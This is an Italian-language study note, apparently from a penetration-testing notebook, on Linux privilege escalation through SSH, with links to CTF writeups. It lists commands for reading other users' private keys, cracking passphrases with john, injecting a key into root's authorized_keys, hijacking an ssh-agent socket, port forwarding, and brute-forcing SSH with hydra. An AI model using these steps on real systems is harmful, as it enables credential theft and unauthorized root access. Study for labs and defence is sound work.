#Privesc_Linux

---
---
---
#### INDICE
- [[#Introduzione]]
- [[#Chiave privata]]
	1. [[#Cracking passphrase]]
- [[#Authorized_keys File Injection]]
- [[#SSH Agent Hijacking]]
- [[#Port forwarding]]

---
---
---
### Introduzione
Sebbene `SSH` sia solitamente associato al controllo remoto, puÃ² rappresentare anche un vettore locale di escalation dei privilegi, specialmente quando:**
- sono presenti chiavi private accessibili localmente;
- la configurazione SSH consente accessi _passwordless_ o _command injection_;
- ci sono permessi errati nei file di autorizzazione (`authorized_keys`);
- si sfruttano servizi `ssh-agent` o Forwarding

---
### Chiave privata
Una volta ottenuto l'accesso alla macchina target, Ã¨ possibile controllare se ci sono chiavi private[[22 - SSH | SSH]] leggibili dall'utente corrente poichÃ© **equivale al possedere una password.** Per effettuare privilege escalation, copiamo la chiave privata in locale ed effettuiamo l'accesso in remoto con essa:

```
find / -name id_rsa 2>/dev/null  #Cercare la chiave privata
cat /home/dev/.ssh/id_rsa  
chmod 600 id_rsa
ssh -i id_rsa dev@localhost`   #Connettersi localmente (se server ssh attivo)
```

> ðŸ§  PuÃ² portare a _lateral movement_ o _escalation diretta_ se lâ€™utente `dev` ha `sudo` o `setuid` privilegi.

ðŸ“šâ€‹ Writeups:
- [[Linux#Clue| Clue]],[[Linux#Luane| Luane]],[[Linux#Postman| Postman]],[[Linux#Valentine| Valentine]],[[Linux#Forge| Forge]],[[Linux#Nineveh| Nineveh]],[[Linux#Kenobi| Kenobi]],

#### Cracking passphrase
Se una chiave privata `id_rsa` Ã¨ protetta da **passphrase**, si puÃ² tentare di craccarla con attacchi a dizionario utilizzando `ssh2john` e `john`.

```
ssh2john id_rsa > id_rsa.hash                                 #Estrai hash da chiave
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt` #Bruteforce
```

> Se la passphrase Ã¨ debole o presente nel dizionario, `john` la caraccherÃ  rapidamente.

ðŸ“šâ€‹ Writeups:
- [[Linux#Traverxec| Traverxec]],[[Linux#Scrutiny| Scrutiny]],

---
### Authorized_keys File Injection
Se si hanno permessi di **scrittura nella `.ssh/authorized_keys`** di un utente privilegiato (es. root o altro utente con sudo), puoi iniettare la tua chiave pubblica:

```
mkdir -p /root/.ssh echo "ssh-rsa AAAAB3Nza..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh
```

Ora puoi eseguire:

```
ssh -i id_rsa root@localhost
```

> âš ï¸ Funziona solo se `sshd` Ã¨ attivo e consente login per quellâ€™utente.

ðŸ“šâ€‹ Writeups:
- [[Linux#Amaterasu| Amaterasu]],

---
### SSH Agent Hijacking
Se un utente privilegiato ha un `ssh-agent` attivo, potresti sfruttarlo se puoi **accedere al suo socket**.

```
ls -la /tmp/ | grep agent                    #Trova il socket
export SSH_AUTH_SOCK=/tmp/ssh-XYZ/agent.1234 #Esporta la variabile:
ssh-add -l ssh user@target                   #Usa `ssh-add` e `ssh`
```


> ðŸ§  In pratica usi la sessione _ssh-agent_ di qualcun altro, senza avere la chiave privata

---
### Port forwarding
Ãˆ possibile configurare un tunnel o sfruttare una sessione SSH giÃ  aperta:

```
ssh -L 8888:127.0.0.1:22 user@localhost
```

Fornisce accesso SSH locale anche da una rete remota o da contesto _non privilegiato_.

ðŸ“šâ€‹ Writeups:
- [[Linux#Nukem| Nukem]],[[Linux#Internal| Internal]],
### Bruteforce

```
hydra -L users.txt  -P rockyou.txt ssh://IP_TARGET
```

ðŸ“šâ€‹ Writeups:
- [[Linux#Hunit| Hunit]],